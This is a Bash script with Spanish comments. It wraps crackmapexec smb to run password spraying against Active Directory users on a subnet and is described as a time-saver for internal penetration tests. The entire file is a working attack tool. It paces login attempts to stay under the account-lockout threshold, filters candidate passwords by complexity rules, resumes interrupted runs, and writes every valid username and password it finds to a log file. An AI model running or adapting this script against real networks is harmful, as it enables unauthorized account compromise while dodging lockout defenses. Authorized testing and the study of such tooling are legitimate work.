#! /bin/bash

#################### FUNCIONES
function usage {
	echo -e "Este script funciona vinculado a crackmapexe smb para testear credenciales de usuarios en una red. Cubre la necesidad de ganar tiempo en pentest internos ya que valida por si solo la cantidad de intentos que deben realizarse y en cuanto tiempo para no bloquear las cuentas de usuario de AD.\nUna vez finalizado el proceso nos encontraremos un archivo llamado *finallogscript* el cual nos brindara informacion precisa sobre el hallazgo, y en caso que deseemos ver logs de crackmapexec smb, existira tambien, un log llamado *logcme*\n***************************************************\n"
	echo -e "Funciones: . Control automatico del tiempo\n. No repeticion de usuarios ya encontrados\n. Validacion de parametros.\n. Posibilidad de configuracion relacionada a password complexity.\n. Creacion de backups de archivos de entrada.\n\n"
	echo "Uso: Abrir una consola :"
	echo -e "./cmeautom.sh [Archivo de usuarios] [Archivo de passwords] [Intentos] [Tiempo Bloqueo] [IP] [Mascara] [Dominio]\n\n***************************************************\n"
	echo -e "Parametros\n"
	echo -e "Archivo de usuarios:	 Se corresponde con el archivo de usuarios los cuales seran intentados loguear con las credenciales propuestas. El archivo debe poseer un usuario por linea\n"
	echo -e "Archivo de passwords:	 Archivo con credenciales. Mismo formato. Una credencial por linea de archivo.\n"
	echo -e "Intentos:	La totalidad de los intentos necesarios para bloquear la cuenta. Es decir, si la cuenta se bloquea luego de 5 intentos (Es decir, el 6to intento no lo podremos hacer ya que la cuenta estara bloqueada) fallidos en 10 minutos, ingresaremos 5.\n"
	echo -e "Tiempo Bloqueo:		El espectro de tiempo en el que se bloquea la contraseña, es decir, si se bloquea a los 5 intentos fallidos en 10 minutos, esos 10 minutos corresponden a este parametro.\n"
	echo -e "IP:	 Red finalizada en cero. Ej: 192.168.0.0\n"
	echo -e "Mascara:	Mascara de subred. Ej: 24\n"
	echo -e "Dominio: 	Dominio de la red. Ej: LAB\n"
	echo -e "\n********************************\nEjemplo de invocacion\n"
	echo -e "./cmeautom.sh usuarios passwords 5 10 192.168.0.0 24 LAB\n"
	echo -e "Funcionalidad añadida:\nSe posee la posibilidad de parametrizar la complejidad de las contraseñas detectadas en el directorio, pudiendo elegir entre contener o no simbolos mayusculas y numeros, ademas del tamaño minimo y maximo de la contraseña.\n En caso de no conocer estos ultimos dos valores colocar numeros a medida, por ejemplo, 0 y 50"
}

function tratamientoPassword(){
	read -p "Cantidad minima de caracteres: " carac1
	read -p "Cantidad maxima de caracteres: " carac2
	read -p "Al menos un numero? S/N: " numeros
	read -p "Al menos una mayuscula S/N: " mayus
	read -p "Al menos un simbolo: S/N: " simb

	grep -E "^.{$carac1,$carac2}$" $1 >> pass.tmp
	rm $1
	mv pass.tmp $1

	if [[ $mayus == "S" || $mayus == "s" ]]; then
		sed -ni '/[A-Z]/p' $1
	fi
	if [[ $numeros == 'S' || $numeros == "s" ]]; then
		sed -ni '/[0-9]/p' $1
	fi
	if [[ $simb == 'S' || $simb == 's' ]]; then
		sed -ni '/[!@#$&()\\-`.+,/\]/p' $1
	fi	
	clear
}

center() {
  termwidth="$(tput cols)"
  padding="$(printf '%0.1s' ={1..500})"
  printf '%*.*s %s %*.*s\n' 0 "$(((termwidth-2-${#1})/2))" "$padding" "$1" 0 "$(((termwidth-1-${#1})/2))" "$padding"
}

function control_c(){
	if [[ -f ultimos.tmp ]]; then
		rm ultimos.tmp
	fi
	if [[ "$band" == 1 ]]; then
		if [[ -f "$archUs.tmp" ]];then
			rm "$archUs"
			cp "$archUs.tmp" "$archUs"
			rm "$archUs.tmp"
		fi
		
		rm $archPw
		cp "$archPw.tmp" "$archPw"
		rm "$archPw.tmp"
	fi
	echo -e "$lines" >> ultimos.tmp #Usuario
	echo -e "$line" >> ultimos.tmp #Password
	kill $PID
	exit
}

#################### FUNCIONES

#################### VALIDACIONES
if [[ $1 == "-help" || $1 == "--help" || $1 == "-h" ]]; then
usage
exit
fi

if [ $# != 7 ]; then
echo "Cantidad de parametros incorrecto. Vuelve a intentarlo."
exit
else
echo "Parametros correctos"
fi
center " Password crack "

cp $1 $1.bak
cp $2 $2.bak
read -p "Desea ingresar valores de complejidad de contraseñas? S/N: " valor
if [[ $valor == "S" || $valor == "s" || $valor == 'S' || $valor == 's' ]]; then
tratamientoPassword $2
else clear
fi

if [[ $3 -lt "1" ]]; then
echo -e "\e[1;31mCantidad de intentos invalido. Debe ser como minimo 1\e[0m"
exit
fi

if [[ $4 == "0" ]]; then
echo -e "\e[1;31mTiempo igual a cero. No esta permitido\e[0m"
exit
fi


val=1
if [[ $3 == "1" ]]; then
echo -e "\e[1;31mCantidad de intentos menor o igual a 1\e[0m"
val=0
fi
#################### VALIDACIONES

#################### MAIN

archUs=$1
archPw=$2
band=0
if [[ -f ultimos.tmp ]]; then
	var=1	
	while read -r ult;
	do
		if [ "$var" == 1 ];then
		ultUser=$(echo $ult)
		var=0
		else
		ultPw=$(echo $ult)
		fi
	done < ultimos.tmp

	echo "Ultimo usuario: $ultUser"
	echo "Ultima PW: $ultPw"
	read -p "Desea continuar desde el ultimo punto? [Usuario: $ultUser][Password: $ultPw]" rta
	if [[ "$rta" == "S" || "$rta" == "s" ]]; then
		cp "$1" "$1.tmp"
		cp "$2" "$2.tmp"
		band=1
		awk "/^$ultPw$/,/*/" $2 > tmp && mv tmp $2		
		awk "/^$ultUser$/,/*/" $1 > tmp && mv tmp $1
		clear
	fi
	
fi

trap control_c SIGINT 

inte=`expr $3 - 1`
tiempo=`expr $4 \* 60`
dominio=$(echo "$7")
i=1
k=0
tamano=$(wc -w $2)
tam="${tamano:0:1}"


center " Se realizaran $inte intentos cada $4 minutos($tiempo segundos) en el dominio $dominio"
while [[ "$i" -lt "$3" && "$k" -lt "$tam" ]];
do
		read -r line
		echo -e "\e[1;32m [+] Contraseña actual: *$line*. Numero: $k\e[0m";
		echo -e "\e[0;32m [++] Intento actual: $i\e[0m"
			while read -r lines; do
				echo -e "\t \e[1;33m [+++] Usuario actual es *$lines*\e[0m"
					resultado=$(crackmapexec smb ${5}/${6} -u $lines -p $line -d $dominio --shares)
					echo -e "$resultado \n" >> logCME
					echo "$resultado"| while read linea; do
						if [[ $linea == *"Enumerating shares"* ]]
						then
							sed -i "s/\<$lines\>//g" $1 ## Aca deberiamos eliminar la palabra del archivo.	
							sed -i '/^ *$/d' $1
							final=$(echo $linea | sed 's/^[^0-9]*\(.*\)/\1/')
				   			echo -e "****************************\nLogin correcto! User: $lines. Password: $line.\nDatos: $final\n****************************" >> finallogscript
							echo -e "\t\t \e[1;37m ****Logueo correcto. Usuario: $lines****\e[0m"
						fi
					done
			done < "$1"
		if [[ $band == 1 ]];then
			rm "$1"
			cp "$1.tmp" "$1"
			rm "$1.tmp"
			band=0
		fi
		let i=i+1
		let k=k+1
	if [[ "$i" == "$3" ]]
	then
		i=1
		echo -e "\e[1;36m Durmiendo por $4 minutos ($tiempo segundos) \e[0\m"
		sleep $tiempo #X tiempo va a permanecer esperando el script
	fi
done < "$2"

center " Fin "
if [[ -f ultimos.tmp ]]; then
		rm ultimos.tmp
	fi
	if [[ "$band" == 1 ]]; then
		if [[ -f "$archUs.tmp" ]];then
			rm "$archUs"
			cp "$archUs.tmp" "$archUs"
			rm "$archUs.tmp"
		fi
		
		rm $archPw
		cp "$archPw.tmp" "$archPw"
		rm "$archPw.tmp"
	fi
#################### MAIN

